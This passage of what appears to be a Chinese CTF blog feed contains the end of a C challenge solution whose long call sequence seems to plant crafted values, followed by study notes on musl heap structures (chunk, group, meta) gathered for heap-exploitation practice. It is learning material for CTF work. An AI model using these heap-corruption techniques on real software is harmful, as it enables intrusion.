<span class="title function_">Qanux173</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux174</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux175</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux176</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux177</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux178</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux179</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux180</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux181</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux182</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux183</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux184</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux185</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux186</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux187</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux188</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux189</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux190</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux191</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux192</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux193</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux194</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux195</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux196</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux197</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux198</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux199</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux200</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux201</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux202</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux203</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux204</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux205</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux206</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux207</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux208</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux209</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux210</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux211</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux212</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux213</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux214</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux215</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux216</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux217</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux218</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux219</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux220</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux221</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux222</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux223</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux224</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux225</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux226</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux227</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux228</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux229</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux230</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux231</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux232</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux233</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux234</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux235</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux236</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux237</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux238</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux239</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux240</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux241</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux242</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux243</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux244</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux245</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux246</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux247</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux248</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux249</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux250</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux251</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux252</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux253</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux254</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux255</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gamestart</span><span class="params">()</span> &#123;</span><br><span class="line">    tiandongwanxiang();</span><br><span class="line">    wuxiangdeyidao();</span><br><span class="line">    guobapenhuo();</span><br><span class="line">    wuxiangdeyidao();</span><br><span class="line">    Qanux000(<span class="number">0</span>);</span><br><span class="line">    Qanux001(<span class="number">1</span>);</span><br><span class="line">    Qanux002(<span class="number">2</span>);</span><br><span class="line">    Qanux003(<span class="number">3</span>);</span><br><span class="line">    Qanux004(<span class="number">4</span>);</span><br><span class="line">    Qanux005(<span class="number">5</span>);</span><br><span class="line">    Qanux006(<span class="number">6</span>);</span><br><span class="line">    Qanux007(<span class="number">7</span>);</span><br><span class="line">    Qanux008(<span class="number">8</span>);</span><br><span class="line">    Qanux009(<span class="number">9</span>);</span><br><span class="line">    Qanux010(<span class="number">10</span>);</span><br><span class="line">    Qanux011(<span class="number">11</span>);</span><br><span class="line">    Qanux012(<span class="number">12</span>);</span><br><span class="line">    Qanux013(<span class="number">13</span>);</span><br><span class="line">    Qanux014(<span class="number">14</span>);</span><br><span class="line">    Qanux015(<span class="number">15</span>);</span><br><span class="line">    Qanux016(<span class="number">16</span>);</span><br><span class="line">    Qanux017(<span class="number">17</span>);</span><br><span class="line">    Qanux018(<span class="number">18</span>);</span><br><span class="line">    Qanux019(<span class="number">19</span>);</span><br><span class="line">    Qanux020(<span class="number">20</span>);</span><br><span class="line">    Qanux021(<span class="number">21</span>);</span><br><span class="line">    Qanux022(<span class="number">22</span>);</span><br><span class="line">    Qanux023(<span class="number">23</span>);</span><br><span class="line">    Qanux024(<span class="number">24</span>);</span><br><span class="line">    Qanux025(<span class="number">25</span>);</span><br><span class="line">    Qanux026(<span class="number">26</span>);</span><br><span class="line">    Qanux027(<span class="number">27</span>);</span><br><span class="line">    Qanux028(<span class="number">28</span>);</span><br><span class="line">    Qanux029(<span class="number">29</span>);</span><br><span class="line">    Qanux030(<span class="number">30</span>);</span><br><span class="line">    Qanux031(<span class="number">31</span>);</span><br><span class="line">    Qanux032(<span class="number">32</span>);</span><br><span class="line">    Qanux033(<span class="number">33</span>);</span><br><span class="line">    Qanux034(<span class="number">34</span>);</span><br><span class="line">    Qanux035(<span class="number">35</span>);</span><br><span class="line">    Qanux036(<span class="number">36</span>);</span><br><span class="line">    Qanux037(<span class="number">37</span>);</span><br><span class="line">    Qanux038(<span class="number">38</span>);</span><br><span class="line">    Qanux039(<span class="number">39</span>);</span><br><span class="line">    Qanux040(<span class="number">40</span>);</span><br><span class="line">    Qanux041(<span class="number">41</span>);</span><br><span class="line">    Qanux042(<span class="number">42</span>);</span><br><span class="line">    Qanux043(<span class="number">43</span>);</span><br><span class="line">    Qanux044(<span class="number">44</span>);</span><br><span class="line">    Qanux045(<span class="number">45</span>);</span><br><span class="line">    Qanux046(<span class="number">46</span>);</span><br><span class="line">    Qanux047(<span class="number">47</span>);</span><br><span class="line">    Qanux048(<span class="number">48</span>);</span><br><span class="line">    Qanux049(<span class="number">49</span>);</span><br><span class="line">    Qanux050(<span class="number">50</span>);</span><br><span class="line">    Qanux051(<span class="number">51</span>);</span><br><span class="line">    Qanux052(<span class="number">52</span>);</span><br><span class="line">    Qanux053(<span class="number">53</span>);</span><br><span class="line">    Qanux054(<span class="number">54</span>);</span><br><span class="line">    Qanux055(<span class="number">55</span>);</span><br><span class="line">    Qanux056(<span class="number">56</span>);</span><br><span class="line">    Qanux057(<span class="number">57</span>);</span><br><span class="line">    Qanux058(<span class="number">58</span>);</span><br><span class="line">    Qanux059(<span class="number">59</span>);</span><br><span class="line">    Qanux060(<span class="number">60</span>);</span><br><span class="line">    Qanux061(<span class="number">61</span>);</span><br><span class="line">    Qanux062(<span class="number">62</span>);</span><br><span class="line">    Qanux063(<span class="number">63</span>);</span><br><span class="line">    Qanux064(<span class="number">64</span>);</span><br><span class="line">    Qanux065(<span class="number">65</span>);</span><br><span class="line">    Qanux066(<span class="number">66</span>);</span><br><span class="line">    Qanux067(<span class="number">67</span>);</span><br><span class="line">    Qanux068(<span class="number">68</span>);</span><br><span class="line">    Qanux069(<span class="number">69</span>);</span><br><span class="line">    Qanux070(<span class="number">70</span>);</span><br><span class="line">    Qanux071(<span class="number">71</span>);</span><br><span class="line">    Qanux072(<span class="number">72</span>);</span><br><span class="line">    Qanux073(<span class="number">73</span>);</span><br><span class="line">    Qanux074(<span class="number">74</span>);</span><br><span class="line">    Qanux075(<span class="number">75</span>);</span><br><span class="line">    Qanux076(<span class="number">76</span>);</span><br><span class="line">    Qanux077(<span class="number">77</span>);</span><br><span class="line">    Qanux078(<span class="number">78</span>);</span><br><span class="line">    Qanux079(<span class="number">79</span>);</span><br><span class="line">    Qanux080(<span class="number">80</span>);</span><br><span class="line">    Qanux081(<span class="number">81</span>);</span><br><span class="line">    Qanux082(<span class="number">82</span>);</span><br><span class="line">    Qanux083(<span class="number">83</span>);</span><br><span class="line">    Qanux084(<span class="number">84</span>);</span><br><span class="line">    Qanux085(<span class="number">85</span>);</span><br><span class="line">    Qanux086(<span class="number">86</span>);</span><br><span class="line">    Qanux087(<span class="number">87</span>);</span><br><span class="line">    Qanux088(<span class="number">88</span>);</span><br><span class="line">    Qanux089(<span class="number">89</span>);</span><br><span class="line">    Qanux090(<span class="number">90</span>);</span><br><span class="line">    Qanux091(<span class="number">91</span>);</span><br><span class="line">    Qanux092(<span class="number">92</span>);</span><br><span class="line">    Qanux093(<span class="number">93</span>);</span><br><span class="line">    Qanux094(<span class="number">94</span>);</span><br><span class="line">    Qanux095(<span class="number">95</span>);</span><br><span class="line">    Qanux096(<span class="number">96</span>);</span><br><span class="line">    Qanux097(<span class="number">97</span>);</span><br><span class="line">    Qanux098(<span class="number">98</span>);</span><br><span class="line">    Qanux099(<span class="number">99</span>);</span><br><span class="line">    Qanux100(<span class="number">100</span>);</span><br><span class="line">    Qanux101(<span class="number">101</span>);</span><br><span class="line">    Qanux102(<span class="number">102</span>);</span><br><span class="line">    Qanux103(<span class="number">103</span>);</span><br><span class="line">    Qanux104(<span class="number">104</span>);</span><br><span class="line">    Qanux105(<span class="number">105</span>);</span><br><span class="line">    Qanux106(<span class="number">106</span>);</span><br><span class="line">    Qanux107(<span class="number">107</span>);</span><br><span class="line">    Qanux108(<span class="number">108</span>);</span><br><span class="line">    Qanux109(<span class="number">109</span>);</span><br><span class="line">    Qanux110(<span class="number">110</span>);</span><br><span class="line">    Qanux111(<span class="number">111</span>);</span><br><span class="line">    Qanux112(<span class="number">112</span>);</span><br><span class="line">    Qanux113(<span class="number">113</span>);</span><br><span class="line">    Qanux114(<span class="number">114</span>);</span><br><span class="line">    Qanux115(<span class="number">115</span>);</span><br><span class="line">    Qanux116(<span class="number">116</span>);</span><br><span class="line">    Qanux117(<span class="number">117</span>);</span><br><span class="line">    Qanux118(<span class="number">118</span>);</span><br><span class="line">    Qanux119(<span class="number">119</span>);</span><br><span class="line">    Qanux120(<span class="number">120</span>);</span><br><span class="line">    Qanux121(<span class="number">121</span>);</span><br><span class="line">    Qanux122(<span class="number">122</span>);</span><br><span class="line">    Qanux123(<span class="number">123</span>);</span><br><span class="line">    Qanux124(<span class="number">124</span>);</span><br><span class="line">    Qanux125(<span class="number">125</span>);</span><br><span class="line">    Qanux126(<span class="number">126</span>);</span><br><span class="line">    Qanux127(<span class="number">127</span>);</span><br><span class="line">    Qanux128(<span class="number">128</span>);</span><br><span class="line">    Qanux129(<span class="number">129</span>);</span><br><span class="line">    Qanux130(<span class="number">130</span>);</span><br><span class="line">    Qanux131(<span class="number">131</span>);</span><br><span class="line">    Qanux132(<span class="number">132</span>);</span><br><span class="line">    Qanux133(<span class="number">133</span>);</span><br><span class="line">    Qanux134(<span class="number">134</span>);</span><br><span class="line">    Qanux135(<span class="number">135</span>);</span><br><span class="line">    Qanux136(<span class="number">136</span>);</span><br><span class="line">    Qanux137(<span class="number">137</span>);</span><br><span class="line">    Qanux138(<span class="number">138</span>);</span><br><span class="line">    Qanux139(<span class="number">139</span>);</span><br><span class="line">    Qanux140(<span class="number">140</span>);</span><br><span class="line">    Qanux141(<span class="number">141</span>);</span><br><span class="line">    Qanux142(<span class="number">142</span>);</span><br><span class="line">    Qanux143(<span class="number">143</span>);</span><br><span class="line">    Qanux144(<span class="number">144</span>);</span><br><span class="line">    Qanux145(<span class="number">145</span>);</span><br><span class="line">    Qanux146(<span class="number">146</span>);</span><br><span class="line">    Qanux147(<span class="number">147</span>);</span><br><span class="line">    Qanux148(<span class="number">148</span>);</span><br><span class="line">    Qanux149(<span class="number">149</span>);</span><br><span class="line">    Qanux150(<span class="number">150</span>);</span><br><span class="line">    Qanux151(<span class="number">151</span>);</span><br><span class="line">    Qanux152(<span class="number">152</span>);</span><br><span class="line">    Qanux153(<span class="number">153</span>);</span><br><span class="line">    Qanux154(<span class="number">154</span>);</span><br><span class="line">    Qanux155(<span class="number">155</span>);</span><br><span class="line">    Qanux156(<span class="number">156</span>);</span><br><span class="line">    Qanux157(<span class="number">157</span>);</span><br><span class="line">    Qanux158(<span class="number">158</span>);</span><br><span class="line">    Qanux159(<span class="number">159</span>);</span><br><span class="line">    Qanux160(<span class="number">160</span>);</span><br><span class="line">    Qanux161(<span class="number">161</span>);</span><br><span class="line">    Qanux162(<span class="number">162</span>);</span><br><span class="line">    Qanux163(<span class="number">163</span>);</span><br><span class="line">    Qanux164(<span class="number">164</span>);</span><br><span class="line">    Qanux165(<span class="number">165</span>);</span><br><span class="line">    Qanux166(<span class="number">166</span>);</span><br><span class="line">    Qanux167(<span class="number">167</span>);</span><br><span class="line">    Qanux168(<span class="number">168</span>);</span><br><span class="line">    Qanux169(<span class="number">169</span>);</span><br><span class="line">    Qanux170(<span class="number">170</span>);</span><br><span class="line">    Qanux171(<span class="number">171</span>);</span><br><span class="line">    Qanux172(<span class="number">172</span>);</span><br><span class="line">    Qanux173(<span class="number">173</span>);</span><br><span class="line">    Qanux174(<span class="number">174</span>);</span><br><span class="line">    Qanux175(<span class="number">175</span>);</span><br><span class="line">    Qanux176(<span class="number">176</span>);</span><br><span class="line">    Qanux177(<span class="number">177</span>);</span><br><span class="line">    Qanux178(<span class="number">178</span>);</span><br><span class="line">    Qanux179(<span class="number">179</span>);</span><br><span class="line">    Qanux180(<span class="number">180</span>);</span><br><span class="line">    Qanux181(<span class="number">181</span>);</span><br><span class="line">    Qanux182(<span class="number">182</span>);</span><br><span class="line">    Qanux183(<span class="number">183</span>);</span><br><span class="line">    Qanux184(<span class="number">184</span>);</span><br><span class="line">    Qanux185(<span class="number">185</span>);</span><br><span class="line">    Qanux186(<span class="number">186</span>);</span><br><span class="line">    Qanux187(<span class="number">187</span>);</span><br><span class="line">    Qanux188(<span class="number">188</span>);</span><br><span class="line">    Qanux189(<span class="number">189</span>);</span><br><span class="line">    Qanux190(<span class="number">190</span>);</span><br><span class="line">    Qanux191(<span class="number">191</span>);</span><br><span class="line">    Qanux192(<span class="number">192</span>);</span><br><span class="line">    Qanux193(<span class="number">193</span>);</span><br><span class="line">    Qanux194(<span class="number">194</span>);</span><br><span class="line">    Qanux195(<span class="number">195</span>);</span><br><span class="line">    Qanux196(<span class="number">196</span>);</span><br><span class="line">    Qanux197(<span class="number">197</span>);</span><br><span class="line">    Qanux198(<span class="number">198</span>);</span><br><span class="line">    Qanux199(<span class="number">199</span>);</span><br><span class="line">    Qanux200(<span class="number">200</span>);</span><br><span class="line">    Qanux201(<span class="number">201</span>);</span><br><span class="line">    Qanux202(<span class="number">202</span>);</span><br><span class="line">    Qanux203(<span class="number">203</span>);</span><br><span class="line">    Qanux204(<span class="number">204</span>);</span><br><span class="line">    Qanux205(<span class="number">205</span>);</span><br><span class="line">    Qanux206(<span class="number">206</span>);</span><br><span class="line">    Qanux207(<span class="number">207</span>);</span><br><span class="line">    Qanux208(<span class="number">208</span>);</span><br><span class="line">    Qanux209(<span class="number">209</span>);</span><br><span class="line">    Qanux210(<span class="number">210</span>);</span><br><span class="line">    Qanux211(<span class="number">211</span>);</span><br><span class="line">    Qanux212(<span class="number">212</span>);</span><br><span class="line">    Qanux213(<span class="number">213</span>);</span><br><span class="line">    Qanux214(<span class="number">214</span>);</span><br><span class="line">    Qanux215(<span class="number">215</span>);</span><br><span class="line">    Qanux216(<span class="number">216</span>);</span><br><span class="line">    Qanux217(<span class="number">217</span>);</span><br><span class="line">    Qanux218(<span class="number">218</span>);</span><br><span class="line">    Qanux219(<span class="number">219</span>);</span><br><span class="line">    Qanux220(<span class="number">220</span>);</span><br><span class="line">    Qanux221(<span class="number">221</span>);</span><br><span class="line">    Qanux222(<span class="number">222</span>);</span><br><span class="line">    Qanux223(<span class="number">223</span>);</span><br><span class="line">    Qanux224(<span class="number">224</span>);</span><br><span class="line">    Qanux225(<span class="number">225</span>);</span><br><span class="line">    Qanux226(<span class="number">226</span>);</span><br><span class="line">    Qanux227(<span class="number">227</span>);</span><br><span class="line">    Qanux228(<span class="number">228</span>);</span><br><span class="line">    Qanux229(<span class="number">229</span>);</span><br><span class="line">    Qanux230(<span class="number">230</span>);</span><br><span class="line">    Qanux231(<span class="number">231</span>);</span><br><span class="line">    Qanux232(<span class="number">232</span>);</span><br><span class="line">    Qanux233(<span class="number">233</span>);</span><br><span class="line">    Qanux234(<span class="number">234</span>);</span><br><span class="line">    Qanux235(<span class="number">235</span>);</span><br><span class="line">    Qanux236(<span class="number">236</span>);</span><br><span class="line">    Qanux237(<span class="number">237</span>);</span><br><span class="line">    Qanux238(<span class="number">238</span>);</span><br><span class="line">    Qanux239(<span class="number">239</span>);</span><br><span class="line">    Qanux240(<span class="number">0</span>);</span><br><span class="line">    Qanux241(<span class="number">0xe0</span>);</span><br><span class="line">    Qanux242(<span class="number">0x77</span>);</span><br><span class="line">    Qanux243(<span class="number">0</span>);</span><br><span class="line">    Qanux244(<span class="number">0</span>);</span><br><span class="line">    Qanux245(<span class="number">0</span>);</span><br><span class="line">    Qanux246(<span class="number">0</span>);</span><br><span class="line">    Qanux247(<span class="number">0</span>);</span><br><span class="line">    Qanux248(<span class="number">248</span>);</span><br><span class="line">    Qanux249(<span class="number">249</span>);</span><br><span class="line">    Qanux250(<span class="number">250</span>);</span><br><span class="line">    Qanux251(<span class="number">251</span>);</span><br><span class="line">    Qanux252(<span class="number">252</span>);</span><br><span class="line">    Qanux253(<span class="number">253</span>);</span><br><span class="line">    Qanux254(<span class="number">254</span>);</span><br><span class="line">    Qanux255(<span class="number">255</span>);</span><br><span class="line">    Qanux240(<span class="number">666</span>);</span><br><span class="line">    Qanux241(<span class="number">666</span>);</span><br><span class="line">    Qanux242(<span class="number">666</span>);</span><br><span class="line">    Qanux243(<span class="number">666</span>);</span><br><span class="line">    Qanux244(<span class="number">666</span>);</span><br><span class="line">    Qanux245(<span class="number">666</span>);</span><br><span class="line">    Qanux246(<span class="number">666</span>);</span><br><span class="line">    Qanux247(<span class="number">666</span>);</span><br><span class="line">    fight(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考：<br><a href="https://zhuanlan.zhihu.com/p/122522485?utm_id=0">https://zhuanlan.zhihu.com/p/122522485?utm_id=0</a><br><a href="https://bbs.kanxue.com/thread-273119.htm#msg_header_h1_0">https://bbs.kanxue.com/thread-273119.htm#msg_header_h1_0</a><br><a href="https://bbs.kanxue.com/thread-274259.htm#msg_header_h2_6">https://bbs.kanxue.com/thread-274259.htm#msg_header_h2_6</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>初探musl</title>
      <link href="/2024/01/17/musl/"/>
      <url>/2024/01/17/musl/</url>
      
        <content type="html"><![CDATA[<p>其实就是对各位大佬博客的各种摘抄和总结···，方便自己以后做题</p><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><p>chunk:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line"> <span class="type">char</span> prev_user_data[];</span><br><span class="line">    <span class="type">uint8_t</span> idx;  <span class="comment">//低5bit为idx第几个chunk</span></span><br><span class="line">    <span class="type">uint16_t</span> offset; <span class="comment">//与第一个chunk起始地址的偏移，实际地址偏移为offset * UNIT,详细请看get_meta源码中得到group地址的而过程！</span></span><br><span class="line">    <span class="type">char</span> data[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在释放后 <code>chunk</code> 头的 <code>idx</code>会变成<code>0xff</code> <code>offset</code> 会清零</p><h3 id="group"><a href="#group" class="headerlink" title="group:"></a>group:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> UNIT 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IB 4</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];<span class="comment">//padding=0x10B</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];<span class="comment">// chunks</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在<code>musl</code>中同一类大小的<code>chunk</code>都是被分配到同一个<code>group</code>中进行管理</p><h3 id="meta"><a href="#meta" class="headerlink" title="meta:"></a>meta:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span><span class="comment">//双向链表</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span><span class="comment">// 这里指向管理的group 地址</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;<span class="comment">// bitmap 的形式体现 chunk 的状态</span></span><br><span class="line">    <span class="type">uintptr_t</span> last_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> freeable:<span class="number">1</span>;<span class="comment">// 代表meta否可以被回收 freeable=0 代表不可以 =1 代表可以</span></span><br><span class="line">    <span class="type">uintptr_t</span> sizeclass:<span class="number">6</span>;<span class="comment">// sizeclass=6 表示由0x6这个group进行管理这一类的大小的chunk</span></span><br><span class="line">    <span class="type">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>)<span class="number">-12</span>;<span class="comment">// meta-&gt;maplen = (needed+4095)/4096</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>maplen &gt;&#x3D; 1表示这个<code>meta</code>里的<code>group</code>是新<code>mmap</code>出来的,长度为多少,并且这个<code>group</code> 不在<code>size_classes</code>里<br>maplen &#x3D;0 表示<code>group</code>不是新<code>mmap</code>出来的在<code>size_classes</code>里<br>细节：</p><ul><li><code>meta</code>一般申请的是堆空间<code>brk</code>分配的，有可能是<code>mmap</code>映射的，而<code>group</code>都是使用的<code>mmap</code>的空间</li><li>由于<code>bitmap</code>的限制,因此一个<code>group</code>中最多只能有<code>32</code>个<code>chunk</code></li></ul><h3 id="meta-area"><a href="#meta-area" class="headerlink" title="meta_area:"></a>meta_area:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span 